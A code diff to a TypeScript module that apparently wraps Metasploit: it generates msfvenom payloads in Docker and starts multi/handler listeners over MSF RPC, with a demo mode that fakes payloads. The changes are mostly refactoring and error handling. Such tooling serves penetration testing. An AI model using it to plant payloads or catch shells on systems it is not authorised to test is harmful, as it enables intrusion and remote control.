@@ -3,7 +3,7 @@ import { getRpcToken, rpcCall } from "./msf-rpc";
 import { execSync } from "child_process";
 import * as fs from "fs";
 import * as path from "path";
-import * as crypto from "crypto";
+import * as crypto from "node:crypto";
 
 const PAYLOADS_DIR = path.join(process.cwd(), "payloads");
 
@@ -47,6 +47,7 @@ export type BackdoorStatus = {
   msfvenomAvailable: boolean;
   dockerAvailable: boolean;
   demoMode: boolean;
+  error?: string;
 };
 
 // ─── Detection ────────────────────────────────────────────────
@@ -77,12 +78,21 @@ export function getBackdoorStatus(): BackdoorStatus {
   if (config.demoMode) {
     return { msfvenomAvailable: false, dockerAvailable: false, demoMode: true };
   }
-  const dockerOk = isDockerAvailable();
-  return {
-    msfvenomAvailable: dockerOk && isMsfvenomInDocker(),
-    dockerAvailable: dockerOk,
-    demoMode: false,
-  };
+  try {
+    const dockerOk = isDockerAvailable();
+    return {
+      msfvenomAvailable: dockerOk && isMsfvenomInDocker(),
+      dockerAvailable: dockerOk,
+      demoMode: false,
+    };
+  } catch (err) {
+    return {
+      msfvenomAvailable: false,
+      dockerAvailable: false,
+      demoMode: false,
+      error: err instanceof Error ? err.message : "unknown",
+    };
+  }
 }
 
 // ─── Payload directory management ─────────────────────────────
@@ -151,7 +161,7 @@ export async function generatePayload(
   if (config.demoMode) {
     const id = `demo-${Date.now()}`;
     const ext = opts.format === "exe" ? "exe" : opts.format === "elf" ? "elf" : opts.format === "ps1" ? "ps1" : opts.format === "py" ? "py" : "bin";
-    const payload: GeneratedPayload = {
+    return {
       id,
       filename: opts.name ?? `payload-${opts.payload.replace(/\//g, "-")}.${ext}`,
       payload: opts.payload,
@@ -162,7 +172,6 @@ export async function generatePayload(
       createdAt: new Date().toISOString(),
       downloaded: false,
     };
-    return payload;
   }
 
   if (!isDockerAvailable() || !isMsfvenomInDocker()) {
@@ -217,18 +226,13 @@ export async function generatePayload(
 
   try {
     execSync(cmd, { timeout: 60000, stdio: "pipe" });
-
-    // Copy from container to host
     const hostPath = path.join(PAYLOADS_DIR, filename);
-    execSync(`docker cp metasploit-rpc:${outputPath} "${hostPath}"`, {
+    execSync(`docker cp metasploit-rpc:"${outputPath}" "${hostPath}"`, {
       timeout: 15000,
     });
-
     const stats = fs.statSync(hostPath);
-    const id = crypto.randomUUID();
-
     return {
-      id,
+      id: crypto.randomUUID(),
       filename,
       payload: opts.payload,
       lhost: opts.lhost,
@@ -252,7 +256,6 @@ export function listGeneratedPayloads(): GeneratedPayload[] {
   if (config.demoMode) return demoPayloads;
 
   ensurePayloadsDir();
-
   const payloads: GeneratedPayload[] = [];
   try {
     const files = fs.readdirSync(PAYLOADS_DIR);
@@ -285,6 +288,15 @@ function generateId(): string {
   return crypto.randomUUID().slice(0, 8);
 }
 
+/**
+ * Create a Metasploit handler listener.
+ *
+ * MSF RPC flow:
+ *   1. console.create        => { id: "1" }
+ *   2. console.write(id, cmd) => { "wrote": <count> }
+ *   3. console.read(id)       => { "data": "...", "prompt": "...", "busy": true/false }
+ *   4. console.destroy(id)    => cleanup
+ */
 export async function createListener(
   payload: string,
   lhost: string,
@@ -293,7 +305,7 @@ export async function createListener(
   const config = getMsfConfig();
 
   if (config.demoMode) {
-    const listener: Listener = {
+    return {
       id: generateId(),
       payload,
       lhost,
@@ -302,44 +314,40 @@ export async function createListener(
       sessionCount: 0,
       createdAt: new Date().toISOString(),
     };
-    return listener;
   }
 
   const token = await getRpcToken();
 
   // Step 1: Create a new console
-  const consoleResult = await rpcCall<{ id: string }>(
-    "console.create",
-    [],
-    token,
-  );
+  const consoleResult = await rpcCall<{ id: string }>("console.create", [], token);
   const consoleId = Number(consoleResult.id);
 
+  // Step 2: Send exploit commands to the console
   const commands = [
     `use exploit/multi/handler`,
     `set PAYLOAD ${payload}`,
     `set LHOST ${lhost}`,
     `set LPORT ${lport}`,
     `set ExitOnSession false`,
-    `set EnableStageEncoding true`,
     `exploit -jz`,
   ];
 
   for (const cmd of commands) {
     await rpcCall("console.write", [consoleId, cmd + "\n"], token);
-    await new Promise((r) => setTimeout(r, 300));
+    await new Promise((r) => setTimeout(r, 500));
   }
 
-  // Read output to verify
-  await rpcCall("console.read", [consoleId], token);
-  await new Promise((r) => setTimeout(r, 1000));
+  // Step 3: Read output to verify
+  await new Promise((r) => setTimeout(r, 2000));
   const output = await rpcCall<{ data: string; prompt: string; busy: boolean }>(
     "console.read",
     [consoleId],
     token,
   );
 
-  const isRunning = output.data.includes("Job") || output.data.includes("Started");
+  const isRunning = output.data
+    ? (output.data.includes("Job") || output.data.includes("Started") || output.data.includes("handler"))
+    : true;
 
   return {
     id: generateId(),
@@ -360,61 +368,60 @@ export async function listListeners(): Promise<Listener[]> {
 
   try {
     const token = await getRpcToken();
-    const jobs = await rpcCall<Record<string, Record<string, string>>>(
+    const jobs = await rpcCall<{ [job_id: string]: Record<string, unknown> }>(
       "job.list",
       [],
       token,
     );
 
-    const sessions = await rpcCall<Record<string, Record<string, string>>>(
+    const sessionInfo = await rpcCall<{ [sid: string]: Record<string, unknown> }>(
       "session.list",
       [],
       token,
     );
 
-    const sessionCount = Object.keys(sessions).length;
+    const totalSessions = Object.keys(sessionInfo || {}).length;
 
-    return Object.entries(jobs).map(([id, info]) => ({
-      id,
-      payload: (info as Record<string, string>).payload ?? "unknown",
-      lhost: (info as Record<string, string>).lhost ?? "0.0.0.0",
-      lport: Number((info as Record<string, string>).lport ?? 4444),
-      status: "running" as const,
-      sessionCount,
-      createdAt: new Date().toISOString(),
-    }));
-  } catch {
+    if (!jobs || Object.keys(jobs).length === 0) return [];
+
+    return Object.entries(jobs).map(([id, info]) => {
+      const infoMap = (info ?? {}) as Record<string, string>;
+      return {
+        id,
+        payload: infoMap.payload ?? infoMap.PAYLOAD ?? "unknown",
+        lhost: infoMap.lhost ?? infoMap.LHOST ?? "0.0.0.0",
+        lport: Number(infoMap.lport ?? infoMap.LPORT ?? 4444),
+        status: "running" as const,
+        sessionCount: totalSessions,
+        createdAt: new Date().toISOString(),
+      };
+    });
+  } catch (err) {
+    // If job.list fails, return empty — MSF might not be ready
     return [];
   }
 }
 
 export async function stopListener(id: string): Promise<void> {
   const config = getMsfConfig();
-
   if (config.demoMode) return;
-
   const token = await getRpcToken();
   await rpcCall("job.stop", [id], token);
 }
 
-// ─── Get demo payload content (for download simulation) ──────
+// ─── Get demo payload content ──────────────────────
 
 export function getDemoPayloadContent(): Buffer {
-  // Return a tiny valid-ish exe header so browsers don't reject it
   const header = Buffer.alloc(1024);
-  // MZ header
   header[0] = 0x4d;
   header[1] = 0x5a;
-  // PE signature offset
   header[0x3c] = 0x80;
   header[0x80] = 0x50;
   header[0x81] = 0x45;
   header[0x82] = 0x00;
   header[0x83] = 0x00;
-  // Machine: x64
   header[0x84] = 0x64;
   header[0x85] = 0x86;
-  // Write a note in the binary
   const note = Buffer.from(
     "[Metasploit Console Demo Payload — Not an actual executable]",
   );
